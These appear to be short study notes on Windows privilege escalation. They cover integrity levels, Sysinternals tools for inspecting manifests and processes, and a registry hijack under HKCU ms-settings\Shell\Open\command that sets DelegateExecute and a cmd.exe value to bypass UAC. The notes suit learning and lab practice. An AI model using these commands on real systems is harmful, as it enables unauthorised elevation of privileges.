# Windows Privilege Escalation Notes  

## Integrity levels  

Find group information and integrity level.  

`whoami /groups`  

Change admin password.  

`net user admin newpassw0rd!`  

To change to high integrity level while admin.  

`powershell.exe Start-Process cmd.exe -Verb runAs`  

## Application manifest  

The application manifest is an xml file that informs the os how to handle the program when it is started.  

Using SysinternalsSuite.  

`sigcheck.exe -a -m C:\Windows\System32\aBinary.exe`  

## Processes  

From SysinternalsSuite, use this binary to find out information about a running process.  

`procmon.exe`  

## Reg Keys  

Find attempts to interact with registry keys that give the error.  

`NAME NOT FOUND`  

To tamper with registry keys, we can find our hive with read/write access, this is current user HKEY_CURRENT_USER.  

`HKCU`  

To add a registry key.  

`REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command`  

To add a registry key with v for value name and t for the type.  

`REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ`  

To add a value to a registry key, d is the value and f to add silently.  

`REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f`  

